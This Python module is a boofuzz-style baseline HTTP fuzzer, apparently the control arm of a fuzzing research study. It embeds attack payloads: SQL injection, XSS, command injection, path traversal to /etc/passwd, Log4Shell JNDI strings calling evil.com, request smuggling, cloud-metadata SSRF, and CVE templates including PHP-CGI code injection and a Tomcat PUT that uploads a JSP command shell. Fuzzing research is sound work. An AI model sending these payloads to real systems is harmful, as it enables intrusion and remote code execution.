"""
Boofuzz Baseline Fuzzer

This module provides the baseline fuzzer using boofuzz's standard
seed generation and mutation strategies.

Uses unified pool architecture:
- seed_pool (10): Pre-generated seeds, refreshed by boofuzz
- mutation_pool (10): Pre-generated mutation templates, refreshed by boofuzz
"""

import random
import string
import copy
from typing import List, Dict, Any, Optional

from .base_fuzzer import BaseFuzzer, FuzzingPayload


class BoofuzzSeedGenerator:
    """
    Seed generator based on boofuzz's approach.

    Generates HTTP request seeds using various fuzzing primitives.
    """

    # HTTP methods to fuzz
    HTTP_METHODS = [
        "GET", "POST", "PUT", "DELETE", "PATCH",
        "OPTIONS", "HEAD", "TRACE", "CONNECT"
    ]

    # Common paths to fuzz (including 2024-2025 CVE patterns)
    HTTP_PATHS = [
        "/",
        "/index.html",
        "/api/v1/",
        "/admin",
        "/login",
        "/user",
        "/search",
        "/upload",
        "/download",
        "/config",
        "/debug",
        "/health",
        "/stats",
        "/.git/config",
        "/etc/passwd",
        "/proc/self/environ",
        # CVE-2024-4577: PHP CGI paths
        "/php-cgi/php-cgi.exe",
        "/cgi-bin/php-cgi",
        "/cgi-bin/php.cgi",
        # CVE-2024-23897: Jenkins CLI paths
        "/cli",
        "/cli?remoting=false",
        "/jnlpJars/jenkins-cli.jar",
        # CVE-2024-50379/CVE-2025-24813: Tomcat paths
        "/manager/html",
        "/manager/text/deploy",
        "/sessions/",
        "/shell.jsp",
        "/test.jspx",
        # CVE-2024-53677: Struts paths
        "/struts/",
        "/upload.action",
        "/fileUpload.do",
    ]

    # Headers to include in fuzzing
    FUZZ_HEADERS = [
        "User-Agent",
        "Accept",
        "Accept-Language",
        "Accept-Encoding",
        "Content-Type",
        "Content-Length",
        "Host",
        "Connection",
        "X-Forwarded-For",
        "X-Forwarded-Host",
        "X-Forwarded-Proto",
        "X-Original-URL",
        "X-Rewrite-URL",
        "Referer",
        "Cookie",
        "Authorization",
        "X-HTTP-Method-Override",
        "Transfer-Encoding",
    ]

    # Common content types
    CONTENT_TYPES = [
        "application/json",
        "application/xml",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "text/plain",
        "text/html",
    ]

    # Fuzz strings based on boofuzz primitives
    FUZZ_STRINGS = [
        # Empty and basic
        "",
        " ",
        "\t",
        "\n",
        "\r\n",

        # Long strings
        "A" * 100,
        "A" * 1000,
        "A" * 10000,
        "B" * 256,
        "C" * 512,
        "D" * 1024,
        "E" * 2048,
        "F" * 4096,

        # Format strings
        "%s" * 10,
        "%n" * 10,
        "%x" * 10,
        "%d" * 10,
        "%.1024d",
        "%.2048d",
        "%p" * 10,

        # SQL injection patterns
        "' OR '1'='1",
        "'; DROP TABLE users;--",
        "1; SELECT * FROM users",
        "admin'--",
        "' UNION SELECT NULL--",

        # XSS patterns
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "<svg onload=alert(1)>",

        # Command injection
        "; ls -la",
        "| cat /etc/passwd",
        "` id `",
        "$(`id`)",
        "&& whoami",

        # Path traversal
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f",
        "..%252f..%252f",
        "..%c0%af..%c0%af",

        # Null bytes
        "\x00",
        "%00",
        "\x00\x00\x00\x00",

        # CRLF injection
        "\r\n",
        "%0d%0a",
        "\r\nHeader: injected",
        "%0d%0aSet-Cookie: evil=true",

        # Unicode
        "\u0000",
        "\uffff",
        "\ud800",
        "A" + "\u0000" + "B",

        # JNDI injection (Log4Shell)
        "${jndi:ldap://evil.com/a}",
        "${jndi:rmi://evil.com/a}",
        "${${lower:j}ndi:ldap://evil.com/a}",
        "${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/a}",

        # SSRF patterns
        "http://localhost",
        "http://127.0.0.1",
        "http://[::1]",
        "http://169.254.169.254",
        "http://metadata.google.internal",
        "file:///etc/passwd",
        "gopher://localhost:25",

        # Integer overflow
        str(2**31 - 1),
        str(2**31),
        str(2**32 - 1),
        str(2**32),
        str(2**63 - 1),
        str(-1),
        str(-2**31),

        # Special characters
        "!@#$%^&*()",
        "'\"><",
        "\\\\\\\\",
        "////",
        "{}[]|\\",

        # CVE-2024-4577: PHP CGI Argument Injection
        "-d allow_url_include=1",
        "-d auto_prepend_file=php://input",
        "%AD-d%20allow_url_include=1",
        "-n -d auto_prepend_file=php://input",

        # CVE-2024-23897: Jenkins CLI File Read
        "@/etc/passwd",
        "@/proc/self/environ",
        "@C:\\Windows\\System32\\config\\SAM",

        # CVE-2024-27316: HTTP/2 CONTINUATION patterns
        "X-HTTP2-Continuation: true",

        # CVE-2025-24813: Tomcat Partial PUT patterns
        "Content-Range: bytes 0-10/100",

        # CVE-2024-53677: Struts Path Traversal
        "%c0%ae%c0%ae/",
        "%c1%1c%c1%1c/",
        "..%252f..%252f",

        # Unicode CRLF bypass (CVE-2024-24795)
        "%e5%98%8a%e5%98%8d",
    ]

    # User agent strings
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "curl/7.68.0",
        "${jndi:ldap://evil.com/exploit}",
        "() { :; }; echo vulnerable",
        "' OR '1'='1",
        "<script>alert(1)</script>",
    ]

    def __init__(self, target_host: str = "localhost", target_port: int = 8080):
        """Initialize the seed generator."""
        self.target_host = target_host
        self.target_port = target_port
        self._seed_counter = 0

    def generate(self) -> FuzzingPayload:
        """
        Generate a random HTTP request seed.

        Returns:
            FuzzingPayload instance
        """
        self._seed_counter += 1

        # Select random components
        method = random.choice(self.HTTP_METHODS)
        path = random.choice(self.HTTP_PATHS)
        headers = self._generate_headers()
        body = self._generate_body(method)

        return FuzzingPayload(
            method=method,
            path=path,
            headers=headers,
            body=body,
            seed_id=f"boofuzz_seed_{self._seed_counter}",
            generation_method="boofuzz_seed"
        )

    def _generate_headers(self) -> Dict[str, str]:
        """Generate random headers."""
        headers = {
            "Host": f"{self.target_host}:{self.target_port}",
            "User-Agent": random.choice(self.USER_AGENTS),
            "Accept": "*/*",
            "Connection": "close",
        }

        # Add random additional headers
        num_extra_headers = random.randint(0, 5)
        for _ in range(num_extra_headers):
            header = random.choice(self.FUZZ_HEADERS)
            if header not in headers:
                headers[header] = random.choice(self.FUZZ_STRINGS + ["normal_value"])

        return headers

    def _generate_body(self, method: str) -> Optional[str]:
        """Generate request body for appropriate methods."""
        if method in ["POST", "PUT", "PATCH"]:
            body_type = random.choice(["json", "form", "raw", "empty"])

            if body_type == "json":
                return '{"key": "' + random.choice(self.FUZZ_STRINGS[:20]) + '"}'
            elif body_type == "form":
                return "field=" + random.choice(self.FUZZ_STRINGS[:20])
            elif body_type == "raw":
                return random.choice(self.FUZZ_STRINGS)
            else:
                return None

        return None


class BoofuzzMutator:
    """
    Mutator based on boofuzz's mutation strategies.
    """

    # Mutation types for pool
    MUTATION_TYPES = [
        "path_traversal",
        "smuggling",
        "ssrf",
        "php_cgi",
        "jenkins_cli",
        "tomcat_put",
        "struts_traversal",
        "http2_continuation",
        "response_splitting",
        "header_injection",
    ]

    def __init__(self):
        """Initialize the mutator."""
        self._mutation_counter = 0

    def mutate(self, payload: FuzzingPayload) -> FuzzingPayload:
        """
        Apply mutations to a payload.

        Args:
            payload: Original payload

        Returns:
            Mutated payload
        """
        self._mutation_counter += 1

        # Create a copy to mutate
        mutated = FuzzingPayload(
            method=payload.method,
            path=payload.path,
            headers=copy.deepcopy(payload.headers),
            body=payload.body,
            seed_id=payload.seed_id,
            mutation_id=f"boofuzz_mut_{self._mutation_counter}",
            generation_method="boofuzz_mutation"
        )

        # Apply random mutations
        mutation_type = random.choice([
            "path", "method", "header_value", "header_add",
            "body", "encoding", "special"
        ])

        if mutation_type == "path":
            mutated = self._mutate_path(mutated)
        elif mutation_type == "method":
            mutated = self._mutate_method(mutated)
        elif mutation_type == "header_value":
            mutated = self._mutate_header_value(mutated)
        elif mutation_type == "header_add":
            mutated = self._mutate_header_add(mutated)
        elif mutation_type == "body":
            mutated = self._mutate_body(mutated)
        elif mutation_type == "encoding":
            mutated = self._mutate_encoding(mutated)
        elif mutation_type == "special":
            mutated = self._apply_special_mutation(mutated)

        return mutated

    def generate_mutation_template(self, mutation_type: str) -> Dict[str, Any]:
        """
        Generate a mutation template for the mutation pool.

        Args:
            mutation_type: Type of mutation

        Returns:
            Dict with mutation parameters
        """
        templates = {
            "path_traversal": {
                "type": "path_traversal",
                "path": random.choice([
                    "/../../../etc/passwd",
                    "/..%252f..%252f..%252fetc/passwd",
                    "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
                    "/.%00.//.%00.//.%00.//etc/passwd",
                    "/%c0%ae%c0%ae/etc/passwd",
                ]),
            },
            "smuggling": {
                "type": "smuggling",
                "headers": {
                    "Transfer-Encoding": "chunked",
                    "Content-Length": "4",
                },
                "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n",
            },
            "ssrf": {
                "type": "ssrf",
                "path": "/latest/meta-data/",
                "headers": {"X-Forwarded-Host": "169.254.169.254"},
            },
            "php_cgi": {
                "type": "php_cgi",
                "method": "POST",
                "path": "/cgi-bin/php-cgi.exe" + random.choice([
                    "?%ADd+allow_url_include%3D1+-d+auto_prepend_file%3Dphp://input",
                    "?-d+allow_url_include=1+-d+auto_prepend_file=php://input",
                ]),
                "body": "<?php system('id'); ?>",
            },
            "jenkins_cli": {
                "type": "jenkins_cli",
                "path": "/cli",
                "headers": {"X-Jenkins-CLI": "@/etc/passwd"},
                "body": random.choice(["@/etc/passwd", "@/proc/self/environ"]),
            },
            "tomcat_put": {
                "type": "tomcat_put",
                "method": "PUT",
                "path": random.choice(["/shell.jsp", "/test.jspx", "/cmd.jsp"]),
                "headers": {"Content-Range": "bytes 0-100/101"},
                "body": "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>",
            },
            "struts_traversal": {
                "type": "struts_traversal",
                "path": "/upload.action",
                "headers": {
                    "Content-Disposition": 'form-data; name="upload"; filename="../../../shell.jsp"',
                    "Content-Type": "multipart/form-data",
                },
            },
            "http2_continuation": {
                "type": "http2_continuation",
                "headers": {"X-HTTP2-Continuation": "true"},
                "extra_headers": {f"X-Header-{i}": "A" * 100 for i in range(10)},
            },
            "response_splitting": {
                "type": "response_splitting",
                "path_suffix": random.choice([
                    "%0d%0aSet-Cookie:%20evil=true",
                    "%e5%98%8a%e5%98%8dSet-Cookie:%20evil=true",
                ]),
            },
            "header_injection": {
                "type": "header_injection",
                "headers": {
                    random.choice(["X-Forwarded-For", "Referer", "User-Agent"]):
                    random.choice(BoofuzzSeedGenerator.FUZZ_STRINGS[:30])
                },
            },
        }

        return templates.get(mutation_type, templates["path_traversal"])

    def apply_mutation_template(self, payload: FuzzingPayload, template: Dict[str, Any]) -> FuzzingPayload:
        """
        Apply a mutation template to a payload.

        Args:
            payload: Original payload
            template: Mutation template

        Returns:
            Mutated payload
        """
        mutated = FuzzingPayload(
            method=template.get("method", payload.method),
            path=template.get("path", payload.path),
            headers=copy.deepcopy(payload.headers),
            body=template.get("body", payload.body),
            seed_id=payload.seed_id,
            mutation_id=f"template_mut_{self._mutation_counter}",
            generation_method=f"boofuzz_{template.get('type', 'unknown')}"
        )
        self._mutation_counter += 1

        # Apply path suffix if present
        if "path_suffix" in template:
            mutated.path += template["path_suffix"]

        # Merge headers
        if "headers" in template:
            mutated.headers.update(template["headers"])

        # Add extra headers if present
        if "extra_headers" in template:
            mutated.headers.update(template["extra_headers"])

        return mutated

    def _mutate_path(self, payload: FuzzingPayload) -> FuzzingPayload:
        """Mutate the request path."""
        mutations = [
            # Path traversal
            lambda p: p.replace("/", "/../"),
            lambda p: p + "/../../../etc/passwd",
            lambda p: p + "%00.html",
            lambda p: p + "?" + "A" * 1000,
            lambda p: "/" + "%2e%2e/" * 10 + "etc/passwd",
            lambda p: p + "\r\nHeader: Injected",
            # Null byte injection
            lambda p: p.replace("/", "/\x00/"),
            # Double encoding
            lambda p: p.replace("/", "%252f"),
            # Long path
            lambda p: "/" + "A" * random.randint(100, 1000),
        ]

        mutation = random.choice(mutations)
        payload.path = mutation(payload.path)
        return payload

    def _mutate_method(self, payload: FuzzingPayload) -> FuzzingPayload:
        """Mutate the HTTP method."""
        unusual_methods = [
            "TRACE", "CONNECT", "DEBUG", "TRACK",
            "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
            "MOVE", "LOCK", "UNLOCK", "SEARCH",
            "GET\r\nX-Injected: true",
            "G\x00ET",
        ]
        payload.method = random.choice(unusual_methods)
        return payload

    def _mutate_header_value(self, payload: FuzzingPayload) -> FuzzingPayload:
        """Mutate a header value."""
        if payload.headers:
            header = random.choice(list(payload.headers.keys()))
            fuzz_value = random.choice(BoofuzzSeedGenerator.FUZZ_STRINGS)
            payload.headers[header] = fuzz_value
        return payload

    def _mutate_header_add(self, payload: FuzzingPayload) -> FuzzingPayload:
        """Add a malicious header (2024-2025 CVEs)."""
        malicious_headers = {
            # General attacks
            "X-Forwarded-For": "127.0.0.1, ${jndi:ldap://evil.com/a}",
            "X-Original-URL": "/admin",
            "X-HTTP-Method-Override": "DELETE",
            "Transfer-Encoding": "chunked",
            "Content-Length": "0\r\n\r\nGET /admin HTTP/1.1",
            "X-Forwarded-Host": "evil.com",
            "X-Forwarded-Proto": "javascript",
            # CVE-2024-27316: HTTP/2 CONTINUATION
            "X-HTTP2-Continuation": "true",
            # CVE-2024-24795: Response Splitting
            "Referer": "http://evil.com%0d%0aSet-Cookie:%20evil=true",
            # CVE-2024-38476: mod_proxy disclosure
            "Via": "1.1 internal-proxy (10.0.0.1)",
            "Forwarded": "for=127.0.0.1;proto=http",
            # CVE-2024-23897: Jenkins CLI
            "X-Jenkins-CLI": "@/etc/passwd",
            # CVE-2025-24813: Tomcat Partial PUT
            "Content-Range": "bytes 0-100/101",
            # CVE-2024-53677: Struts file upload
            "Content-Disposition": 'form-data; name="file"; filename="../../../shell.jsp"',
        }

        header, value = random.choice(list(malicious_headers.items()))
        payload.headers[header] = value
        return payload

    def _mutate_body(self, payload: FuzzingPayload) -> FuzzingPayload:
        """Mutate the request body."""
        body_mutations = [
            '{"__proto__": {"admin": true}}',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            "A" * 10000,
            '{"$where": "function(){return true}"}',
            "field=" + "A" * 5000,
        ]
        payload.body = random.choice(body_mutations)
        return payload

    def _mutate_encoding(self, payload: FuzzingPayload) -> FuzzingPayload:
        """Apply encoding mutations."""
        import urllib.parse

        # URL encode path
        if random.random() > 0.5:
            payload.path = urllib.parse.quote(payload.path, safe="")
        else:
            # Double encode
            payload.path = urllib.parse.quote(urllib.parse.quote(payload.path, safe=""), safe="")

        return payload

    def _apply_special_mutation(self, payload: FuzzingPayload) -> FuzzingPayload:
        """Apply special attack mutations (2024-2025 CVEs)."""
        mutation_type = random.choice(self.MUTATION_TYPES)
        template = self.generate_mutation_template(mutation_type)
        return self.apply_mutation_template(payload, template)


class BoofuzzBaseline(BaseFuzzer):
    """
    Baseline fuzzer using boofuzz-style seed generation and mutation.

    Uses unified pool architecture:
    - seed_pool (10): Pre-generated seeds, refreshed by boofuzz every 10 iterations
    - mutation_pool (10): Pre-generated mutation templates, refreshed every 10 iterations

    This serves as the control group in the ablation study.
    """

    def __init__(
        self,
        target_host: str = "127.0.0.1",
        target_port: int = 8080,
        pool_size: int = 10,
        refresh_interval: int = 10,
        **kwargs
    ):
        """
        Initialize the boofuzz baseline fuzzer.

        Args:
            target_host: Target server host
            target_port: Target server port
            pool_size: Size of seed and mutation pools (default: 10)
            refresh_interval: Refresh pools every N iterations (default: 10)
        """
        super().__init__(target_host=target_host, target_port=target_port, **kwargs)

        self.seed_generator = BoofuzzSeedGenerator(target_host, target_port)
        self.mutator = BoofuzzMutator()

        # Pool settings
        self.pool_size = pool_size
        self.refresh_interval = refresh_interval

        # Initialize pools
        self._seed_pool: List[FuzzingPayload] = []
        self._mutation_pool: List[Dict[str, Any]] = []
        self._iteration_counter = 0

        # Initialize pools with boofuzz
        self._refresh_seed_pool()
        self._refresh_mutation_pool()

        self.logger.info(
            f"Initialized BoofuzzBaseline: pool_size={pool_size}, "
            f"refresh_interval={refresh_interval}"
        )

    @property
    def variant_name(self) -> str:
        return "boofuzz_baseline"

    def generate_seed(self) -> FuzzingPayload:
        """Generate a seed from the seed pool."""
        self._iteration_counter += 1

        # Refresh pools every N iterations
        if self._iteration_counter % self.refresh_interval == 0:
            self._refresh_seed_pool()
            self._refresh_mutation_pool()

        # Get seed from pool (round-robin)
        if self._seed_pool:
            idx = (self._iteration_counter - 1) % len(self._seed_pool)
            # Return a copy to avoid mutation of pool items
            seed = self._seed_pool[idx]
            return FuzzingPayload(
                method=seed.method,
                path=seed.path,
                headers=copy.deepcopy(seed.headers),
                body=seed.body,
                seed_id=f"pool_seed_{self._iteration_counter}",
                generation_method="boofuzz_pool"
            )

        # Fallback to direct generation
        return self.seed_generator.generate()

    def mutate(self, payload: FuzzingPayload) -> FuzzingPayload:
        """Mutate using a template from the mutation pool."""
        # Get mutation template from pool (round-robin)
        if self._mutation_pool:
            idx = (self._iteration_counter - 1) % len(self._mutation_pool)
            template = self._mutation_pool[idx]
            return self.mutator.apply_mutation_template(payload, template)

        # Fallback to direct mutation
        return self.mutator.mutate(payload)

    def _refresh_seed_pool(self):
        """Refresh the seed pool with new boofuzz-generated seeds."""
        self._seed_pool.clear()
        for _ in range(self.pool_size):
            self._seed_pool.append(self.seed_generator.generate())
        self.logger.debug(f"Refreshed seed pool with {len(self._seed_pool)} seeds")

    def _refresh_mutation_pool(self):
        """Refresh the mutation pool with new mutation templates."""
        self._mutation_pool.clear()
        mutation_types = BoofuzzMutator.MUTATION_TYPES
        for i in range(self.pool_size):
            mutation_type = mutation_types[i % len(mutation_types)]
            self._mutation_pool.append(
                self.mutator.generate_mutation_template(mutation_type)
            )
        self.logger.debug(f"Refreshed mutation pool with {len(self._mutation_pool)} templates")

    def get_stats(self) -> Dict[str, Any]:
        """Get fuzzer statistics."""
        stats = super().get_stats()
        stats.update({
            "seed_pool_size": len(self._seed_pool),
            "mutation_pool_size": len(self._mutation_pool),
            "iteration_counter": self._iteration_counter,
            "refresh_interval": self.refresh_interval,
        })
        return stats
